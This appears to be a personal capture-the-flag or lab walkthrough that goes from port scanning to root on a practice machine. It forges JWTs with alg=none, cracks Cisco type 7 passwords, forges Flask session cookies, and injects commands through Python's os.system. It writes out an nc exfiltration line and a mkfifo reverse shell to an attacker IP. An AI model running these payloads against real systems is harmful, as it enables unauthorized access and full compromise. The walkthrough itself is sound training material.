nmap shows ports 22 and 5555 open.
Nothing special on port 5555

Deep nmap scan shows port 20202 open.
There's a login, and an option for guest login.
Once we login as guest, we're John Doe, and we see in the discussions, they've mentioned "JWT is not implemented properly"
Right click -> inspect -> storage -> cookies -> JWT
Copy the JWT. Consists of 
**Header,** typically consists of two parts: the type of token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA.
**Payload**, which contains the claims. Claims are statements about an entity (typically, the user) and additional data. There are three types of claims: registered, public, and private claims.
**Signature**, used to verify that the sender of the JWT is who it says it is and to ensure that the message wasn’t changed along the way. You have to take the encoded header, the encoded payload, a secret, the algorithm specified in the header, and sign that.
We can use https://jwt.io/ to decode it
```zsh
echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIxIiwiZ3Vlc3QiOiAidHJ1ZSIsImFkbWluIjogZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' | base64 -d
#{"typ":"JWT","alg":"HS256"}base64: invalid input
#only the first part is getting decoded properly. One of the . separated fields are not getting decoded. So we decode one-by-one

#Header
echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9' | base64 -d
#{"typ":"JWT","alg":"HS256"}

#Payload
echo 'eyJpZCI6ICIxIiwiZ3Vlc3QiOiAidHJ1ZSIsImFkbWluIjogZmFsc2V9' | base64 -d
#{"id": "1","guest": "true","admin": false}

#signature
echo 'SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' | base64 -d
#I�J�IHǊ(]�O��ǉ~�:N�%base64: invalid input
```

Now, all we need to do is, experiment with id 0,1,2,3,etc and then make the second part as
```json
{"id": 2, "guest":"false", "admin":"true"}
```
And perhaps change the signature? But if we change the "alg" to none, we can skip it
```zsh
echo -n '{"typ":"JWT","alg":"none"}'|base64
#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=                 
echo -n '{"id": "0","guest": "false","admin": true}'|base64
#eyJpZCI6ICIwIiwiZ3Vlc3QiOiAiZmFsc2UiLCJhZG1pbiI6IHRydWV9

#concatenate both and add a . at the end, leave the last field empty
#ignore the = padding
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6ICIwIiwiZ3Vlc3QiOiAiZmFsc2UiLCJhZG1pbiI6IHRydWV9.
```
Click on login, intercept the req on burp, and replace the cookie's JWT part with the above

This should log us into admin panel.
Once we do, we see a message, "config looks good" . But there were no links in the site. neither did gobuster give anything useful (bad wordlist?)

Looking at burp's sitemap, we see a /cisco_config page
Visit it, intercept the req in burp, replace JWT
We find a bunch of things, including "ssh logs with cisco type 7 passwords"

https://www.ifm.net.nz/cookbooks/passwordcracker.html - to crack cisco type7 and cisco type 5 passwords

```zsh
nxc ssh 192.168.163.141 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
#[+] john:NezukoCh@n  Linux - Shell access!
ssh john@IP
NezukoCh@n
```
john!

---
looking at john's documents folder, we find a calc.bak file, which has a config password set `Fl@sKy_Sup3R_S3cR3T`. Furthermore, we can see the math functions it uses are done using `eval` function of `os` module, which hints to command injection

`ps -ef` shows the calculator webpage is possibly being run by root, which would give us root-level command injection
`/bin/bash /root/Calculator/start.sh`

But for all this, we still need to loginto the calculator webpage
Since we know this is a flask web app, we google "flask exploit" and find article by hacktricks
https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/flask.html explained at the bottom of this note.

So, we now login, capture the "Session" cookie with burp, unsign base64 (no pass req), modify, resign using password, and try to login to calculator flask webapp
```zsh
sudo /opt/ven1/bin/pip install flask-unsign 

/opt/venv1/bin/flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.afMvNQ.adtckw7jHylMudq7RB4A1EwNfpQ'
#{'logged_in': False}

/opt/venv1/bin/flask-unsign --sign --cookie "{'logged_in': True}" --secret "Fl@sKy_Sup3R_S3cR3T" 
#eyJsb2dnZWRfaW4iOnRydWV9.afNSfg.2fkGUjbI05T0snl6BhwyQzyqv34
```

With this, we login to calculator webapp
Now, to test the command injection, since the code is running on python, and we saw an `import os` in the code, we can try using `os.system("command")`

Click on divide, capture request on burp. change either of the values from `value1=3&value2=5` to `value1=3&value2=os.system("curl+192.168.45.221/file"` 

This sends out a request and hence command injection is confirmed
```http
value1=3&value2=os.system("id|nc+192.168.45.221+80")
<!-- shows root id>
```

This machine's nc did not support the `-e` option, and did not have a `/dev/tcp` file.
mkfifo rev shell to the rescue.

```http
value1=3&value2=os.system("mkfifo+/tmp/f%3b+nc+192.168.45.221+22+<+/tmp/f+|+/bin/sh+>/tmp/f+2>%261%3b+rm+/tmp/f")
```

---
Info section ----
Flask cookie decoder - http://kirsle.net/wizards/flask-session.cgi
Cookie will be signed using a password. If we know the password, we can unsign it using https://pypi.org/project/flask-unsign/
Basically, it explains how we can capture a cookie during logging in, unsign it with a known password, modify and resign it.
```zsh
pip install flask-unsign

#decode
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'

#brute-force
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval

#signing
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'

#legacy signing
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```

End of Info ---

---